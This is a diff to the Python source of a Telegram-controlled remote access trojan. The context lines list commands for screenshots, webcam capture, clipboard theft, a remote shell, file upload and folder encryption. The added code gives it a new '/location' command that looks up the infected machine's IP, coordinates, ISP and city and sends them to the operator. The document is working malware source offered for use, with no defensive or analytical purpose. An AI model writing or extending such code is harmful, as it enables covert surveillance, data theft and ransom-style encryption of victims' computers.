@@ -11,6 +11,7 @@ import subprocess
 import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
+import requests
 
 TOKEN = 'YOUR-TOKEN'  
 
@@ -22,7 +23,7 @@ bot.set_webhook()
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown  ')
+    bot.send_message(message.chat.id, 'Welcome! Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/wifi \n/speech [hi] \n/shutdown \n/location Get device location information')
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
@@ -57,6 +58,30 @@ def send_system_info(message):
         'Processor': platform.processor(),
         'CPU Cores': os.cpu_count(),
         'Username': os.getlogin(),
+    }
+    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
+    bot.send_message(message.chat.id, system_info_text)
+
+@bot.message_handler(commands=['location'])
+def send_location(message):
+    response = requests.get('https://ipinfo.io/json')
+    data = response.json()
+    ip = data.get('ip', 'Unknown')
+    location = data.get('loc', '').split(',')
+    latitude = location[0] if len(location) > 0 else 'Unknown'
+    longitude = location[1] if len(location) > 1 else 'Unknown'
+    isp= data.get('org', 'Unknown')
+    city = data.get('city', 'Unknown')
+    region = data.get('region', 'Unknown')
+    country = data.get('country', 'Unknown')
+    system_info = {
+        'IP Address':ip,
+        'Latitude': latitude,
+        'Longitude': longitude,
+        'ISP': isp,
+        'City': city,
+        'Region': region,
+        'Country': country,
     }
     system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
     bot.send_message(message.chat.id, system_info_text)
